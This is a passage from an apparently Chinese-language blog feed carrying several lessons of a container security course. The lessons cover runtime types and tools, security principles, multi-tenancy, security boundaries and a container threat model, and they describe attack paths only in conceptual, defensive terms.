内核的交互</th><th>安全</th><th>用例</th></tr></thead><tbody><tr><td>底层的 Runtime</td><td>直接与操作系统内核交互的最基本的、最小的 Runtime</td><td>直接与操作系统交互；高效、细粒度的控制；</td><td>对资源的细粒度控制</td><td>与 namespace 和 cgroup 等功能直接交互；</td><td>具备基本的安全功能，主要依赖于宿主机操作系统的安全功能；</td><td>需要轻量级的、最小的工具来运行容器；有其他用于处理编排的工具的大型系统；</td></tr><tr><td>高层的 Runtime</td><td>更抽象，还提供了除了基本的容器运行之外的其他功能。</td><td>镜像管理；基本的网络功能；友好的用户交互；</td><td>更广泛的管理功能，通常与编排平台集成；</td><td>抽象交互，通常需要通过额外的界面进行；</td><td>通常包括或集成了额外的安全功能；</td><td>全面的容器管理；适用于开发环境；</td></tr><tr><td>专门的 Runtime</td><td>为特定的平台或用例定制的 Runtime，例如：kubernetes 的边缘计算</td><td>针对特定的平台进行了优化；可能包括针对物联网等特定环境的功能；</td><td>根据特定 Runtime 及预期用例而变化；</td><td>各不相同，但通常会根据特定的环境或平台优化</td><td>可能包括针对目标平台或用例的专门的安全功能；</td><td>Kubernetes 部署；边缘计算和以物联网为中心的应用程序；</td></tr></tbody></table><h2 id="0x04-常见的-Runtime-工具"><a href="#0x04-常见的-Runtime-工具" class="headerlink" title="0x04 常见的 Runtime 工具"></a>0x04 常见的 Runtime 工具</h2><p>由于 Runtime 功能强大且用户广泛，市场上有许多关于 Runtime 的工具，如下所示：</p><table><thead><tr><th>Runtime 工具</th><th>描述</th><th>特征</th><th>安全</th><th>用例</th></tr></thead><tbody><tr><td>Docker</td><td>用户在容器中创建、部署和操作应用程序的全方位的平台</td><td>用户友好界面；集成容器编排；支持镜像管理；支持跨平台；</td><td>集成安全功能；定期更新补丁</td><td>全面的容器管理；适用于开发和生产环境；</td></tr><tr><td>containerd</td><td>业界标准的 Runtime，强调易用性、可靠性和跨平台的兼容性；</td><td>支持 OCI 格式的镜像；支持镜像的推送与拉取；支持多租户；支持 OCI 运行时规范</td><td>注重标准和合规性，设计安全；定期的漏洞扫描；</td><td>全面的容器管理；适用于开发和生产环境；</td></tr><tr><td>runC</td><td>基于 OCI 标准的启动和管理容器的命令行界面工具</td><td>底层操作；与操作系统直接交互；轻量级和简约；专注于容器的执行；</td><td>包含基本的安全功能，主要依赖于宿主机的操作系统的安全功能；支持安全配置；</td><td>需要与容器进程直接交互的场景；高度的控制和定制；</td></tr><tr><td>CRI-O</td><td>为 Kubernetes 环境量身定制的精简的 Runtime</td><td>针对 Kubernetes 进行了优化；支持 OCI 格式的镜像；使用 CNI 进行网络连接；默认安全；</td><td>设计的时候充分考虑了 Kubernetes 的安全性；定期更新以应对 Kubernetes 特定的威胁；</td><td>Kubernetes 的部署环境；优先考虑效率和 Kubernetes 兼容性的环境；</td></tr><tr><td>Podman</td><td>由社区驱动的处理容器和 pod 的 Runtime 工具，与 kubernetes 系统完全兼容</td><td>无守护进程且轻量级；与 Docker 兼容；支持 Kubernetes；支持跨平台</td><td>rootless 操作增强了安全性；支持安全配置和策略；</td><td>安全、轻量级的容器管理；安全优先的环境；与 Kubernetes 兼容的部署；</td></tr></tbody></table><p><a href="https://www.docker.com/" title="Docker">Docker</a>在众多 Runtime 中脱颖而出，成为一个多功能且用户友好的平台，非常适合需要集成环境来构建、分发和运行应用程序的开发人员；</p><p><a href="https://containerd.io/" title="Containerd">Containerd</a>和<a href="https://github.com/opencontainers/runc" title="Runc">Runc</a>提供了更专业和更底层的功能，在 Runtime 的核心方面精益求精；</p><p><a href="https://github.com/cri-o/cri-o" title="CRI-O">CRI-O</a>针对 Kubernetes 进行优化，使其成为 Kubernetes 生态系统中可以投入大量资金的首要选择；</p><p><a href="https://podman.io/" title="Podman">Podman</a>通过使用无守护进程的容器管理脱颖而出，提供了一种独特的方法，与以安全为重点的简约环境完美契合；</p><p>总而言之，不同种类的 Runtime 反映了容器领域中不断发展的多样化的需求，也为各种部署策略和运行要求提供了定制的解决方案；</p><h2 id="0x05-安全风险"><a href="#0x05-安全风险" class="headerlink" title="0x05 安全风险"></a>0x05 安全风险</h2><p>容器化的环境本质上比传统的工作负载更加复杂，具体体现在：</p><ol><li><strong>更大的攻击面。</strong> 由于容器及其各种底层镜像的多样性，其攻击面比传统的工作负载要大得多；</li><li><strong>共享内核的架构。</strong> 容器共享宿主机的操作系统内核。因此，仅保护主机的安全是远远不够的，我们还需要对容器之间的隔离进行安全配置。若没有进行安全配置，容器中的任何漏洞都有可能会危害整个主机；</li><li><strong>动态环境。</strong> 容器化工作负载的高度动态特性带来了可观测性的挑战，这使得传统的监控工具难以跟踪；</li></ol><p>因此，采用整体的安全策略至关重要。理想的安全策略应该涵盖镜像构建到 Runtime 的监控的方方面面，例如：</p><ol><li><strong>镜像安全防护</strong>。在镜像部署之前先进行漏洞扫描，并修复镜像中的漏洞；</li><li><strong>镜像仓库安全防护</strong>。在镜像仓库中实施安全访问控制与镜像签名；</li></ol><p>因为，最佳的容器安全的实践应该为：</p><ol><li><strong>确保部署环境的安全。</strong> 实施更强大的防火墙规则，对宿主机的操作系统进行加固；使用提供安全的 API 接口和 RBAC 的编排工具；遵循最小权限原则，将容器配置成以最小的权限运行，避免以 root 或高权限运行容器；确保镜像中未嵌入 secret；</li><li><strong>监控容器互动。</strong> 实施细粒度的监控，以提供容器健康和行为的可见性。</li></ol><h2 id="0x06-结论"><a href="#0x06-结论" class="headerlink" title="0x06 结论"></a>0x06 结论</h2><p>本文，我们了解到 Runtime 主要负责从容器镜像仓库中拉取镜像、管理镜像的生命周期，以及在系统上执行容器的所有操作。</p><p>此外，我们还回顾了 Runtime 的历史，了解它们在现代软件开发中的作用以及与虚拟机的区别。</p><p>最后，我们还研究了不同类型的 Runtime 工具之间的区别及其安全风险。更多内容请查看我们的【容器安全防护基础】课程中的：</p><ul><li><a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">《1.2 容器威胁模型》</a></li><li><a href="../../../../2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/">《1.3 安全边界》</a></li><li><a href="../../../../2024/06/18/1-5-%E5%AE%89%E5%85%A8%E5%8E%9F%E5%88%99/">《1.5 安全原则》</a></li></ul><p>接下来，我们再简单分析一下：Docker、containerd、CRI-O 和 runc 之间的区别～</p><hr>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.5 安全原则</title>
    <link href="/2024/06/18/1-5-%E5%AE%89%E5%85%A8%E5%8E%9F%E5%88%99/"/>
    <url>/2024/06/18/1-5-%E5%AE%89%E5%85%A8%E5%8E%9F%E5%88%99/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最后，我们来介绍一般性的指导方针，无论您对任何环境进行防护，这些原则都被认为是最佳的方法。</p><h2 id="0x01-最小权限原则"><a href="#0x01-最小权限原则" class="headerlink" title="0x01 最小权限原则"></a>0x01 最小权限原则</h2><p><strong>您应该限制一个人或一个组件的权限，让它用最小的权限也可以完成工作。</strong></p><p>例如：</p><ul><li>若一个微服务的功能仅仅是在电子商务应用中对产品搜索；</li></ul><p>那么，可以拥有的权限为：</p><ul><li>以只读的方式访问产品的数据库数据；</li></ul><p>这时，不能拥有的权限为：</p><ul><li>访问用户信息；</li><li>访问支付信息；</li><li>写入产品信息；</li></ul><h2 id="0x02-纵深防御"><a href="#0x02-纵深防御" class="headerlink" title="0x02 纵深防御"></a>0x02 纵深防御</h2><p>接下来，我们将介绍多种方式可以提升您的部署环境及运行在该环境中的应用程序的安全性。</p><p>但该原则告诉我们：<strong>您应该使用多层防护机制</strong>，即如果攻击者能够突破一层防御，另一层防御则应该阻止他们对您的部署环境造成伤害或窃取你的数据。</p><h2 id="0x03-减少攻击面"><a href="#0x03-减少攻击面" class="headerlink" title="0x03 减少攻击面"></a>0x03 减少攻击面</h2><p>一般而言，一个系统越复杂，攻击成功的可能性就越高。因此，我们可以<strong>简化系统的复杂性，以减少系统的攻击面</strong>。例如：</p><ul><li>尽可能地让接口小而简单，从而减少访问路径；</li><li>限制可以访问服务的用户和组件；</li><li>最小化代码量；</li></ul><h2 id="0x04-限制爆炸半径"><a href="#0x04-限制爆炸半径" class="headerlink" title="0x04 限制爆炸半径"></a>0x04 限制爆炸半径</h2><p><strong>将系统的安全控制分割成更小的子组件或单元。</strong> 如果最坏的事情发生了，那么其影响范围就会受到限制。</p><p>容器就非常适用于该原则，因为您可以将架构划分为多个微服务的实例，然后使用容器来充当安全边界。</p><h2 id="0x05-职责分离"><a href="#0x05-职责分离" class="headerlink" title="0x05 职责分离"></a>0x05 职责分离</h2><p>该原则与前面的最小权限和限制爆炸半径相关，即<strong>尽可能地赋予不同的组件或人员所需的系统整体最小子集的权限</strong>。</p><p>这样可以确保要成功执行某个操作，必须拥有多个用户的权限，从而限制了单个特权用户被攻陷可能会造成的伤害。</p><h2 id="0x06-应用"><a href="#0x06-应用" class="headerlink" title="0x06 应用"></a>0x06 应用</h2><p>若您坚持学完本课程，您将看到：容器的细粒度非常适合应用这些安全原则。</p><ul><li><p><strong>最小权限</strong></p><p>您可以为不同的容器分配可以完成其任务的最小的权限集。</p></li><li><p><strong>深度防御</strong></p><p>容器为应用程序提供了一个安全边界，我们可以在这个安全边界中强制地实施安全防护措施。</p></li><li><p><strong>减少攻击面</strong></p><p>将单体应用拆分为简单的微服务，并在它们之间创建清晰的接口。</p><p>微服务结构如果设计得当，可以减少系统的复杂性，从而可以减少供给面。但也有人认为，容器的编排调度会变得复杂，这又会引入另外一个供给面了。</p></li><li><p><strong>限制爆炸半径</strong></p><p>如果容器化的应用程序被攻陷了，那么安全控制可以让攻击仅在容器内部发生，而不会影响到系统的其他部分。</p></li><li><p><strong>职责分离</strong></p><p>权限和凭证只能传递到所需要的容器中，这样一组密钥的泄漏不一定意味着所有密钥都会被泄漏。</p></li></ul><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这些原则听起来很不错，但是在实际使用中往往会被不良的错误系统配置、受污染的容器镜像成份或不安全的操作所抵消。我们希望可以通过本课程的学习，您将能够避免容器化部署环境中可能出现的安全陷阱，并充分利用其带来的好处。</p><p>经过<a href="../../../../2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/">《第 1 课 容器安全威胁建模》</a>的学习，您已经对容器环境的攻击有了一个较高的层次的视角，并且了解了可以抵御这些攻击的安全原则。</p><p>接下来，我们将深入探讨支撑起容器的底层技术，以便于了解如何结合安全工具和最佳实践流程来实施这些安全原则。</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.4 多租户</title>
    <link href="/2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/"/>
    <url>/2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我们在<a href="../../../../2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/">《1.3 安全边界》</a>中简单说明了安全边界的概念和重要性。众所周知，“多租户”是云计算的一大特点，而云原生是“云计算 2.0”。所以，接下来让我们来看看多租户环境下，其安全边界将面临哪些威胁。</p><h2 id="0x01-多租户的概念"><a href="#0x01-多租户的概念" class="headerlink" title="0x01 多租户的概念"></a>0x01 多租户的概念</h2><p>在 20 世纪 60 年代的大型机时代，多租户的概念就存在了，当时的用户可以租用共享机器上的 CPU 时间、内存和存储空间等资源。</p><p><img src="/image/image_33fjLHAnZH.png" alt="图 1:20 世纪 60 年代的大型机" title="图1：20世纪60年代的大型机"></p><p>这和如今的公有云并没有太大的区别。因为，现在的用户也可以在亚马逊 的 AWS、微软的 Azure 或谷歌的云平台等公有云平台上租用 CPU 时间、内存和存储空间等资源，此外，用户还可以租用公有云的其他功能和托管服务。</p><p><img src="/image/image_bui3nXuWHY.png" alt="图 2：单租户 VS 多租户" title="图2：单租户 VS 多租户"></p><p>2006 年 8 月 24 日，亚马逊的 AWS 推出了 EC2，此后我们便可以租用运行在世界各地数据中心机架上的虚拟机实例了。虽然很多虚拟机都运行在物理机上，但你无法知道是谁操作你邻近的虚拟机。</p><p><img src="/image/image_o2YkdvUsJC.png" alt="图 3：亚马逊的 AWS 推出了 EC2" title="图3：亚马逊的AWS推出了EC2"></p><h2 id="0x02-共享机器"><a href="#0x02-共享机器" class="headerlink" title="0x02 共享机器"></a>0x02 共享机器</h2><p>一台 Linux 主机（或虚拟机）可能会被多个用户共享。这样的多租户的例子在大学中非常常见。</p><p>在这种情况下，不仅用户之间彼此不信任，连系统管理员也不信任用户。因此，<strong>管理员需要利用 Linux 的访问控制来严格限制用户的访问权限</strong>，让每个用户都拥有一个登录 ID。这时，用户只能查看并修改自己目录中的文件，不能访问并修改他人目录中的文件。</p><p><img src="/image/image_49HsuwdA6d.png" alt="图 4：Linux 的访问控制" title="图4：Linux 的访问控制"></p><p>但正如我们在 <strong>《第 4 课：容器之间的隔离》</strong> 中所说到的那样：<strong>所有运行在同一宿主机上的容器都共享一个内核。</strong> 因此，若这台机器正在运行 Docker 守护进程，那么任何能执行 Docker 命令的用户都拥有 root 访问权限。</p><p><img src="/image/image_P3IgVRrDTC.png" alt="图 5：Docker 容器 VS 虚拟机" title="图5：Docker 容器 VS 虚拟机"></p><p>很明显，系统管理员不愿意将这种权限授予不受信任的用户。因此，在企业环境中，甚至在云原生环境中，你不太可能会看到这种共享机器的方式。事实上，哪怕彼此信任的用户或用户团队通常都会以虚拟机的形式进行资源分配的。</p><h2 id="0x03-虚拟化"><a href="#0x03-虚拟化" class="headerlink" title="0x03 虚拟化"></a>0x03 虚拟化</h2><p>但请注意的是，<strong>虚拟化并不算是多租户</strong>：从<a href="https://en.wikipedia.org/wiki/Multitenancy" title="定义">定义</a>上来说，多租户指的是不同的用户群体共享一个软件实例。而在虚拟化的环境中，用户通过无法访问 hypervisor（虚拟机管理程序）来管理虚拟机，即用户不共享任何软件。</p><p>一般来说，虚拟机之间的隔离是非常强的，你的“邻居”不太可能观察或干涉到你在虚拟机中的行为。关于如何实现这种隔离，我们将在 <strong>《第 5 课：虚拟机》</strong> 中进行讲解。</p><p>但也并不是说虚拟机之间的隔离就是非常完美的，曾有用户抱怨过“嘈杂邻居”的问题，即由于您与其他用户共享一台物理机，所以可能会导致性能出现意外的波动。</p><p><img src="/image/image_T5C36QnFhx.png" alt="图 6：嘈杂邻居的问题" title="图6：嘈杂邻居的问题"></p><p>作为最早一批使用公有云的厂商，Netflix 在 2010 年 12 月 16 日发表了一篇名为<a href="https://netflixtechblog.com/5-lessons-weve-learned-using-aws-1f2a28588e4c" title="《5 Lessons We’ve Learned Using AWS》">《5 Lessons We’ve Learned Using AWS》</a>的博客。在这篇博客中，Netflix 表示“合租模式可能在堆栈的任何层次引入吞吐量的变动。为了保证系统的可靠性和高效性，您要么在必要时放弃所运行的子任务，要么在 AWS 内管理您的资源以避免合租。”</p><p>2016 年 5 月 24 日，David Linthicum 发表了一篇名为<a href="https://www.infoworld.com/article/3073503/debunking-the-clouds-noisy-neighbor-myth.html" title="《Debunking the cloud&#39;s &#39;noisy neighbor&#39; myth》">《Debunking the cloud’s ‘noisy neighbor’ myth》</a>的博客，在这篇博客中，他认为“嘈杂邻居”已经不再是一个真正的问题了。</p><p>不仅如此，也有一些<strong>已知的软件漏洞会破坏虚拟机之间的安全边界</strong>。对于政府、金融或医疗部门等机构而言，这些漏洞所造成的后果会十分严重，因此完全的物理隔离是十分有必要的。</p><p><img src="/image/image_aQcE7cQrmW.png" alt="图 7：虚拟机逃逸漏洞" title="图7：虚拟机逃逸漏洞"></p><p>我们建议您<strong>搭建一个私有云来确保工作负载可以被完全地隔离起来</strong>。这个私有云可以运行在您的数据中心中，也可以让服务提供商代为管理。不仅如此，私有云有时还会附带额外的安全功能，例如，对有权访问数据中心的人员进行额外的背景调查。</p><p>许多云提供商会提供物理机或虚拟机两种租赁方式。若您租赁的是虚拟机，可以让供应商保证你是物理机上唯一的客户；若您租赁的是物理机，您将得到一个裸金属的机器。这两种方式都可以保证您是物理机上的唯一的客户，所以您将具备物理机之间的更强的隔离性，并将完全避免“嘈杂邻居”的问题。&#x20;</p><p><img src="/image/image_IfcmNVTYGe.png" alt="图 8：私有云 VS 公有云" title="图8：私有云 VS 公有云"></p><p>但无论您是在私有云中使用物理机还是虚拟机，还是使用自己的服务器，只有您运行着容器，您都需要考虑容器之间多租户的安全边界问题。</p><h2 id="0x04-容器多租户"><a href="#0x04-容器多租户" class="headerlink" title="0x04 容器多租户"></a>0x04 容器多租户</h2><p>正如您在 <strong>《第 4 课：容器之间的隔离》</strong> 中所看到的那样：<strong>容器之间的隔离比不上虚拟机之间的那么强。</strong></p><p>虽然这取决于您的风险状况，但说实话，您可能也不希望和不信任的人在同一台机器上使用容器。退一万步来讲，即使您与完全信任的人在同一台机器上使用容器，但您应该也希望容器之间不受干扰来减轻人为失误所带来的风险。</p><p>在 Kubernetes 中，您可以使用 Namespace（命名空间）来细分集群机器，以供不同的人、团队或应用程序使用。想要做到这一点，只需使用 RBAC（role-based access control，基于角色的访问控制）即可。</p><p><img src="/image/image_hb-c2oYnhf.png" alt="图 9：多租户模型的剧群" title="图9：多租户模型的剧群"></p><p>但在这篇文章中，我们不会详细介绍如何通过 RBAC 来进行配置，详情请看 Kubernetes 的<a href="https://kubernetes.io/zh-cn/docs/concepts/security/multi-tenancy/" title="官方文档">官方文档</a>。需要注意的是，RBAC 仅能控制您可以通过 Kubernetes API 进行的操作。</p><blockquote><p>🚥友情提示，Namespace 是一个多义词：</p><ol><li>在 Linux 中，Namespace 是可以隔离进程可见资源的底层机制；</li><li>在 Kubernetes 中，Namespace 可以对集群资源应用不同的访问控制；</li></ol><p>我们将在 <strong>《第 4 课：容器之间的隔离》</strong> 中进行讲解。</p></blockquote><p>不仅如此，运行在同一宿主机上的同一个 Pod 的容器即使位于不同的 Namespace 中，但其安全边界的保护仍然依赖于容器的隔离机制，所以如果攻击者可以从容器中逃逸到宿主机上，即使容器处于不同的 Namespace 中，它们仍然有可能相互影响或互相干扰。</p><h2 id="0x05-容器实例"><a href="#0x05-容器实例" class="headerlink" title="0x05 容器实例"></a>0x05 容器实例</h2><p>像亚马逊的 AWS、微软的 Azure 和谷歌的云平台这样的公有云提供商都提供了许多托管服务，让用户无需安装或管理即可租用组件、存储及其他组件。</p><p>例如，亚马逊提供关系数据库服务（Relational Database Service，RDS），若您购买了该服务，您只需简单配置一下就可以使用 PostgreSQL 等知名的软件数据库，若您想备份数据只需简单勾选一下即可（当然还需要支付相关费用）。</p><p>如今，托管服务也扩展到了容器的领域。例如 Azure 的<a href="https://azure.microsoft.com/en-us/products/container-instances" title="Container Instances">Container Instances</a>和 AWS 的<a href="https://aws.amazon.com/cn/fargate/" title="Fargate">Fargate</a>可以让您无需考虑底层主机（或虚拟机）就可以轻松地运行容器。</p><p><img src="/image/image_mtm8pYblM2.png" alt="图 10：AWS 的 Fargate" title="图 10：AWS的Fargate"></p><p>这样就可以大大地减轻管理的负担，并且您可以随意地扩展部署环境。然而，理论上，您的容器实例可能会与其他客户的容器实例运行在同一虚拟机上。如果有疑问，请咨询相应的云服务提供商。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>现在，您已经了解了您的部署环境可能面临的诸多潜在威胁，但在探讨其他内容之前，我们还需要学习一些基本的安全原则。</p><p>这些安全原则可以指导您如何在部署环境中引入安全工具与安全流程。</p><p>下期再见～</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.3 安全边界</title>
    <link href="/2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/"/>
    <url>/2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面，我们用很长的篇幅介绍了<a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">《1.2 容器威胁模型》</a>，并说明这些威胁的共同目标都是为了突破安全边界。</p><p>你一定很好奇：什么是安全边界，以及如何突破安全边界？这对于建立容器安全防护观又有什么影响呢？</p><p>别急，我们逐一进行讲解。</p><h2 id="0x01-安全边界"><a href="#0x01-安全边界" class="headerlink" title="0x01 安全边界"></a>0x01 安全边界</h2><p>安全边界（信任边界）在系统中无处不在，若您想在各种不同的安全边界之间“反复横跳”，您得需要各种不同的权限合集。</p><p>那安全边界是怎么设置的呢？有的是通过管理方式设置的，例如：在 Linux 系统中，系统管理员可以通过修改用户所属的组来指定用户可以访问哪些安全边界的文件。</p><p><img src="/image/image_UoaYFFHbqn.png" alt="图 1：Linux 用户与权限" title="图1：Linux用户与权限"></p><p>如果您对 Linux 的文件权限不是很熟悉，我们将在 <strong>《第 2 课：Linux 系统调用、权限和 Capabilities》</strong> 中为您进行简单的回顾。</p><p><strong>在云原生的世界里，容器就是安全边界</strong>，容器中的应用程序就应该只在容器中运行，除非您明确赋予了应用程序跨越安全边界的权限（例如，通过挂载卷的方式），那么它不能也不应该访问容器之外的数据代码。</p><h2 id="0x02-突破安全边界"><a href="#0x02-突破安全边界" class="headerlink" title="0x02 突破安全边界"></a>0x02 突破安全边界</h2><p>攻击者与他的目标之间存在越多的安全边界，他就越无法获取该目标，这里的目标可以是您的用户数据。但正如前面我们所学习的<a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">《1.2 容器威胁模型》</a>所描述的那样，攻击者可以将攻击向量串联起来，以突破多个安全边界。例如：</p><p><img src="/image/image_HDzEjQF2rM.png" alt="图 2：突破安全边界的流程" title="图2：突破安全边界的流程"></p><ol><li>若攻击者发现应用程序中的依赖存在漏洞，那么他们可以在容器中远程执行代码。</li><li>如果容器中没有可以直接访问的有价值的数据，那么攻击者就需要找到一种方法来离开容器（无论是进入其他的容器还是逃逸到宿主机中）。在这里，我们列举出两种方法以供参考：<ol><li>通过容器自带的逃逸漏洞从容器中逃逸。</li><li>通过容器的不安全配置进行逃逸。</li></ol></li><li>若攻击者成功地从容器内逃逸到了宿主机上，那么他下一个目标应该是要获取宿主机的<code>root</code>权限。在这里我们提出一种对于开发者而言非常容易中招，而对于攻击者而言非常简单的方法，那就是：<ol><li>应用程序在容器内以 <code>root</code>的身份运行。具体原因我们将在 <strong>《第 4 课：容器之间的隔离》</strong> 中揭晓。</li></ol></li><li>攻击者获取到宿主机的 <code>root</code> 权限过后，就可以访问宿主机上的任何内容了，甚至可以说是宿主机上运行的容器都可以访问宿主机上的所有内容了。</li></ol><p>所以，为了避免此类事件的发生，在部署环境中增加或加强安全边界是个很不错的主意。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>本文，我们简述了安全边界的概念，并且提出：<strong>在云原生的世界里，容器就是安全边界</strong>。容器所面临的大多数风险都起源于<strong>安全边界被突破</strong>，因此若要提升系统环境的安全性，小小地增加或加强安全边界就可以达到显著的效果。</p><p>为了让大家深入理解突破安全边界的威胁，我们结合了容器的威胁模型的内容，将攻击向量串联起来，向大家进行展示。</p><p>在这里，我们再次强调使用威胁模型的重要性，因为威胁模型考虑了来自应用程序运行环境内部的攻击可能性。在云的部署环境中，您可能会与其他的用户及其应用程序共享一些资源。这种共享及其资源的特性被称为<strong>多租户性</strong>，它对于威胁模型同样有着重要的影响。我们下一讲揭晓～</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.2 容器威胁模型</title>
    <link href="/2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/"/>
    <url>/2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面我们介绍了<a href="../../../../2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/index.html">《1.1 风险、威胁和缓解措施》</a>的基本概念，了解了什么是风险管理框架和威胁模型。那么我们该如何对容器进行威胁建模呢？首先，我们先思考：<strong>参与者有哪些？</strong></p><h2 id="0x01-参与者"><a href="#0x01-参与者" class="headerlink" title="0x01 参与者"></a>0x01 参与者</h2><p>一个良好的威胁建模方式往往从考虑<strong>参与者</strong>开始，在容器的世界里，这可能包括：</p><ul><li><strong>外部攻击者</strong>：试图从外部访问系统环境的人。</li><li><strong>内部攻击者</strong>：已经成功地访问了部分系统环境的人。</li><li><strong>恶意的内部参与者</strong>：对系统环境有一定权限的恶意的访问者，例如恶意的开发人员和管理员。</li><li><strong>无意中的内部参与者</strong>：对系统环境有一定权限的可能会意外造成问题的参与者。</li><li><strong>应用程序进程</strong>：进程虽然不是有意损害您的系统环境的有意识的个体，但它可以通过编程的方式对系统环境进行访问。</li></ul><p>这些参与者都有一定的权限合集，我们可以站在他们的角度去思考下面的问题：</p><ul><li><strong>他们通过凭据可以获得哪些访问权限。</strong> 例如，他们是否可以访问容器所在的宿主机上的用户账号？</li><li><strong>容器中包含哪些权限</strong>。例如，在 Kubernetes 中，你可以使用 <a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/" title="RBAC">RBAC</a> （role-based access control，基于角色的访问控制）鉴权来为用户管理集群资源的访问权限，也可以使用<a href="https://juejin.cn/post/7213298252534972474" title="匿名用户">匿名用户</a>。</li><li><strong>都有哪些网络访问权限。</strong> 例如，部分系统是否包含在 VPC（Virtual Private Cloud，虚拟私有云）中？</li></ul><p>在<a href="https://docs.cilium.io/en/stable/security/threat-model/#threat-model" title="Cilium 的官方文档">Cilium 的官方文档</a>中，我们看到了 Cilium 的团队也使用这种方式进行威胁建模。</p><p><img src="/image/image_k7jNPYthXP.png" alt="图 1：Cilium 的威胁模型" title="图1：Cilium的威胁模型"></p><h2 id="0x02-容器威胁模型"><a href="#0x02-容器威胁模型" class="headerlink" title="0x02 容器威胁模型"></a>0x02 容器威胁模型</h2><p>想要攻击一个容器化的环境，这可有太多的可能的方式了。但我们有个方法可以尽量地都找到它们，那就是：<strong>从容器的生命周期的各个阶段去考虑潜在的攻击向量</strong>。</p><p><img src="/image/image_ZZOe1YFZbi.png" alt="图 2：容器攻击向量" title="图2：容器攻击向量"></p><h3 id="2-1-应用程序代码的漏洞"><a href="#2-1-应用程序代码的漏洞" class="headerlink" title="2.1 应用程序代码的漏洞"></a>2.1 应用程序代码的漏洞</h3><p><strong>容器的生命周期始于开发人员编写的应用程序代码</strong>，这些代码和所依赖的第三方库可能包含着成千上万个已被披露的漏洞。如果应用程序包含这些漏洞，那么对于攻击者而言，它就是个“香饽饽”。</p><p>为了避免运行中的容器包含已知的漏洞，最好的方法是<strong>对镜像进行扫描</strong>，我们将在 <strong>《第 7 课：镜像中的软件漏洞》</strong> 中进行详细的讲解。</p><p><strong>需要强调的是，镜像扫描需要周期性进行。</strong> 白帽子会不断地从已知的代码中发现新的漏洞，镜像扫描所依赖的漏洞库也需要不断地更新。不仅如此，容器中的组件也会随着时间的推移而渐渐地过时，所以也需要更新安全补丁。</p><p>此外，一些镜像扫描器还能扫描镜像中的恶意软件。</p><h3 id="2-2-容器镜像的不良配置"><a href="#2-2-容器镜像的不良配置" class="headerlink" title="2.2 容器镜像的不良配置"></a>2.2 容器镜像的不良配置</h3><p>应用程序代码写完后，<strong>开发人员会构建一个镜像，将应用程序容器化</strong>。</p><p>但构建镜像时，也会带来很多隐藏的风险点，这些风险可能会导致之后运行的容器被攻击利用。例如：将镜像配置成以 root 用户的身份运行；赋予它远超过实际使用所需要的更多的主机权限。</p><p>这部分的内容，我们将在 <strong>《第 6 课：容器镜像》</strong> 中进行讲解。</p><h3 id="2-3-构建机上的攻击"><a href="#2-3-构建机上的攻击" class="headerlink" title="2.3 构建机上的攻击"></a>2.3 构建机上的攻击</h3><p>如果攻击者能够<strong>影响甚至修改镜像的构建方式</strong>，那么镜像可能会被插入恶意代码，然后攻击者再让这些恶意代码在生产环境中运行。</p><p>并且，在构建环境中建立落脚点是攻破生产环境的基石，这部分内容我们也将在 <strong>《第 6 课：容器镜像》</strong> 中进行讲解。</p><h3 id="2-4-供应链攻击"><a href="#2-4-供应链攻击" class="headerlink" title="2.4 供应链攻击"></a>2.4 供应链攻击</h3><p>镜像构建成功后，我们会将其<strong>推送到镜像仓库</strong>中，若需要运行，我们只需要从镜像仓库中拉取镜像即可。</p><p>但您又怎么知道您所拉取的镜像与之前推送的镜像完全相同呢？它们有没有可能会被篡改？</p><p>要知道，若攻击者可以<strong>在构建环境和部署环境之间修改甚至替换镜像</strong>，那么他完全有可能在您的部署环境中运行任意代码。</p><p>这也是我们在 <strong>《第 6 